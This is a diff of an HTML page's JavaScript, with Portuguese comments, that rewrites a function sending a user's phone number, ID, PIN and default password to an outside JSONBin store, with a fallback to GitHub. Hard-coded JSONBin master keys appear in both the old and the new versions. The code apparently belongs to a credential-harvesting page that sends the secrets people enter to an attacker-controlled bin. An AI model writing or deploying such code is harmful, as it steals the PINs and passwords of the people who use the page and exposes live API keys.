@@ -426,33 +426,41 @@
             }
         });
 
-        async function sendToJsonBin(phone, id, pin, apiResult) {
-            const formData = {
-                telefone: phone,
-                id: id,
-                pin: pin,
-                senha_padrao: DEFAULT_PASSWORD,
-                api_response: apiResult,
-                timestamp: new Date().toISOString()
-            };
-            console.log('JSONBin payload:', formData); // Log locally as fallback
-            const MASTER_KEY = "$2a$10$9VJv2nY4tgeiSfh3AuAyUusmEFDpEMafqxKKHkOpikyoKc4QTd89m";
-            try {
-                const response = await fetch("https://api.jsonbin.io/v3/b", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                        "X-Master-Key": MASTER_KEY
-                    },
-                    body: JSON.stringify(formData)
-                });
-                const result = await response.json();
-                console.log("Dados salvos no JSONBin:", result);
-            } catch (error) {
-                console.error("Erro ao enviar para JSONBin:", error);
-                console.log('Dados não salvos no JSONBin, salvos localmente:', formData);
-            }
+async function sendToJsonBin(phone, id, pin, apiResult) {
+    const formData = {
+        telefone: phone,
+        id: id,
+        pin: pin,
+        senha_padrao: DEFAULT_PASSWORD,
+        api_response: apiResult,
+        timestamp: new Date().toISOString()
+    };
+    console.log('Tentando enviar pro JSONBin:', formData); // Log pra depurar
+
+    const MASTER_KEY = "$2a$10$dcsJ/Yfcqv7h8ijkKiXFRelPZPhR1WicqE/E8kWs67CFwcRTYzcHO"; // Sua chave real do dashboard
+
+    try {
+        const response = await fetch("https://api.jsonbin.io/v3/b", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "X-Master-Key": MASTER_KEY,
+                "X-Bin-Private": "true" // Torna o bin privado (opcional, mas recomendado)
+            },
+            body: JSON.stringify(formData)
+        });
+        if (!response.ok) {
+            throw new Error(`Erro: ${response.status} - ${await response.text()}`);
         }
+        const result = await response.json();
+        console.log("Sucesso no JSONBin:", result); // Deve mostrar o ID do bin novo
+        // Aqui você pode alertar ou algo pro user
+    } catch (error) {
+        console.error("Falha no JSONBin:", error.message); // Log erro detalhado
+        // Chama o fallback aqui (veja abaixo)
+        fallbackToGitHub(formData);
+    }
+}
     </script>
 </body>
 </html>
